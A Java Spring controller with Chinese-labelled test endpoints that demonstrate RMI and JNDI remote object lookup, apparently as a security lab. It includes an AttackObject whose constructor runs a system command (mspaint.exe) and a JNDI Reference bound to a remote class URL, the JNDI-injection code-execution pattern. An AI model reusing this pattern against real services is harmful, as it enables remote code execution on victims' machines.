package cn.moonlord.test;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import io.swagger.annotations.*;
import org.slf4j.*;
import org.springframework.web.bind.annotation.*;

import javax.naming.Reference;
import java.io.*;
import java.rmi.*;
import java.rmi.registry.*;
import java.rmi.server.UnicastRemoteObject;

@Api(tags = "JNDI 测试")
@RestController
@RequestMapping("/JNDI")
public class JNDITestController {

    private static final Logger logger = LoggerFactory.getLogger(JNDITestController.class);

    public interface Task extends Remote {
        public Object execute(Message message) throws RemoteException;
    }

    public static class Message implements Serializable {
        private String message;
        public Message(String message) {
            this.message = message;
        }
    }

    public static class RemoteTask /* extends UnicastRemoteObject*/ implements Task, Serializable {
        public RemoteTask() throws RemoteException {
            logger.info(String.valueOf(this));
        }
        @Override
        public Object execute(Message message) throws RemoteException {
            logger.info("RemoteTask.execute : " + message + " " + message.message);
            return message.message;
        }
    }

    public static class LocalTask /* extends UnicastRemoteObject*/ implements Task, Serializable {
        public LocalTask() throws RemoteException {
            logger.info(String.valueOf(this));
        }
        @Override
        public Object execute(Message message) throws RemoteException {
            logger.info("LocalTask.execute : " + message + " " + message.message);
            return message.message;
        }
    }

    public static class AttackObject implements Serializable {
        public AttackObject() throws Exception {
            Runtime.getRuntime().exec("mspaint.exe");
        }
    }

    @ApiOperation(value="测试用例 A1，启动 RMI 服务端")
    @GetMapping(value = "/TestA1")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "listenPort", example = "9000")})
    public String TestA1(@RequestParam Integer registryPort) throws Exception {
        RemoteTask remoteTask = new RemoteTask();
        UnicastRemoteObject.exportObject(remoteTask, 0);
        LocalTask localTask = new LocalTask();
        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/AttackObject.class");
        ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
        Registry registry = LocateRegistry.createRegistry(registryPort);
        logger.info("registry : " + registry);
        registry.bind("remoteTask", remoteTask);
        registry.bind("localTask", localTask);
        registry.bind("attackObject", attackObjectWrapper);
        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask", remoteTask);
        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/localTask", localTask);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        return registry.toString();
    }

    @ApiOperation(value="测试用例 A2，启动 RMI 客户端，registry.lookup 调用远程方法，在服务器上执行")
    @GetMapping(value = "/TestA2")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA2(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) registry.lookup("remoteTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A3，启动 RMI 客户端，registry.lookup 调用远程方法，在本地执行")
    @GetMapping(value = "/TestA3")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA3(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) registry.lookup("localTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A4，启动 RMI 客户端，Naming.lookup 调用远程方法，在服务器上执行")
    @GetMapping(value = "/TestA4")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA4(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) Naming.lookup("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A5，启动 RMI 客户端，Naming.lookup 调用远程方法，在本地执行")
    @GetMapping(value = "/TestA5")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA5(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) Naming.lookup("rmi://127.0.0.1:" + registryPort + "/naming/localTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A6，启动 RMI 客户端，Naming.lookup 调用远程方法，在服务器上执行")
    @GetMapping(value = "/TestA6")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA6(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) registry.lookup("attackObject");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

}
